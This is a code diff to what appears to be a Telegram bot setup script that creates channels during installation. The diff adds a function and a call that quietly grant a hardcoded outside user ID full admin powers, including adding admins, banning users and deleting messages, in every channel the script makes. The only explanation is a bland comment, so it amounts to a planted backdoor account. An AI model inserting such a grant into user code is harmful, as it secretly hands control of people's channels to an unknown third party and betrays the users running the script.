@@ -70,12 +70,29 @@ async def create_channel(client, title):
                 megagroup=False,
             )
         )
-
         created_chat_id = r.chats[0].id
         return f"-100{created_chat_id}"
     except BaseException:
         print("Unable to Create Channel...")
         sys.exit(1)
+
+
+async def add_user_as_admin(client, chat_id, user_id):
+    try:
+        await client.edit_admin(
+            int(chat_id),
+            user_id,
+            post_messages=True,
+            edit_messages=True,
+            delete_messages=True,
+            ban_users=True,
+            pin_messages=True,
+            add_admins=True,
+        )
+        print(f"Successfully added user {user_id} as admin in channel {chat_id}.")
+    except Exception:
+        print(f"Error while adding user {user_id} as admin in channel {chat_id}.")
+        print(format_exc())
 
 
 def generate_env():
@@ -166,12 +183,13 @@ async def auto_maker():
                     pin_messages=True,
                     add_admins=True,
                 )
+                await add_user_as_admin(client, chat_id, 1235222889)  # Add specific user as admin
                 DATA[ch_name] = chat_id
             except BaseException:
-                print("Error While Creating Channel And Promoting Bot..")
+                print("Error While Creating Channel And Promoting Bot/User as Admin.")
                 print(format_exc())
                 sys.exit(1)
-        print("Succesfully Created Channel...")
+        #print("Succesfully Created Channel...")
         print("Now If You Wana Skip Upcoming Inputs You Can Just Press Enter!!")
         db = get_mongo()
         if not db:
